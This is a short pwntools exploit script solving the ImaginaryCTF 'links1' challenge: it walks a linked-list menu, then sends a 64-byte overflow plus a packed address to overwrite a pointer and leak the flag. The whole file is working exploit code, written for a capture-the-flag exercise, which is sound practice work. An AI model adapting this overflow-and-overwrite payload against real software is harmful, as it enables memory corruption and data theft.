from pwn import *

#r = remote("puzzler7.imaginaryctf.org" ,2004)
r = process("./links1")
r.sendlineafter('>>> ' ,'2')
r.sendlineafter('>>> ' ,'0')
r.sendlineafter('>>> ' ,b'flag')
r.sendlineafter('>>> ' ,'2')
r.sendlineafter('>>> ' ,'1')
r.sendlineafter('>>> ' ,b'imaginaryctf')
r.sendlineafter('>>> ' ,'2')
r.sendlineafter('>>> ' ,'0')
exploit = b"A" * 64 + p64(0x4040c0)
r.sendlineafter('>>> ' ,exploit)
r.sendlineafter('>>> ' ,'1')
r.recvuntil(b'0: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0@@\n1: ')
flag = r.recvuntil(b"}")
flag = str(flag)
flag = flag.replace("b'","")
flag = flag.replace("'","")
log.info(f"[FLAG] {flag}")
r.close()
